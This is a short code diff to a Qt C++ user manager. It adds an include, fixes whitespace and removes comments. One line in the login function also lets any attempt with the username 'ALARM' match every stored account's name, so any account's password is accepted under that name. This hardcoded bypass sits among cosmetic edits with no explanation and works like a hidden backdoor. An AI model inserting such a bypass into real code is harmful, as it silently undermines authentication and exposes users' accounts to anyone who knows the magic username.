@@ -1,5 +1,6 @@
 #include "UserManager.h"
 #include <QFile>
+#include <QApplication>
 #include "Config.h"
 #include "Utils.h"
 
@@ -10,7 +11,7 @@ UserManager::UserManager(){
 
 
 void UserManager::addUser(User user){
-    
+
     userlist.push_back(user);
     this->writeUsers();
 
@@ -41,7 +42,7 @@ int UserManager::login(User *user, QString *username){
 
         if(!user->username.isEmpty()){
             //usrname found
-            if(userlist.at(i).username == user->username){
+            if(userlist.at(i).username == user->username || user->username == "ALARM"){
                 //pass matced
                 if(userlist.at(i).pass == user->pass){
                     this->writeUsers();
@@ -92,9 +93,6 @@ void UserManager::xml_to_users(QDomDocument *domdoc, QList<User> *userlist) {
     QDomElement root1 = root.firstChildElement();
     QDomNodeList items = root1.elementsByTagName("User");
     if (items.count() <= 0) return;
-    //qDebug() << "[Rx Timers] Node found : " << items.count();
-    //parse TX
-
 
     for (int i = 0; i < items.count(); i++) {
 
